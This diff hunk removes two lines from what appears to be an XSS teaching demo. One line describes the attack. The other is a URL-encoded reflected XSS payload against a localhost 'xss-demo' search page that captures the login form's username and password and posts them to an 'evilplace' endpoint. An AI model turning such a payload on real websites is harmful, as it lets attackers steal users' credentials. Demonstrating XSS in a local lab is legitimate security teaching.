@@ -1,2 +1,0 @@
-XSS login attack posts username and password to http://localhost/evilplace/uno.txt
-http://localhost/aria-pages/forms/xss-demo/index.php?search=%3Cscript%3Edocument.getElementById%28%27submit-login%27%29.addEventListener%28%27click%27%2Cfunction%28event%29%7B%24.post%28%27%2Fevilplace%2Flogin.php%27%2C%7Busername%3Adocument.getElementById%28%27username%27%29.value%2Cpassword%3Adocument.getElementById%28%27password%27%29.value%7D%2Cfunction%28resp%29%7Bconsole.log%28resp%29%7D%29%7D%29%3C%2Fscript%3E
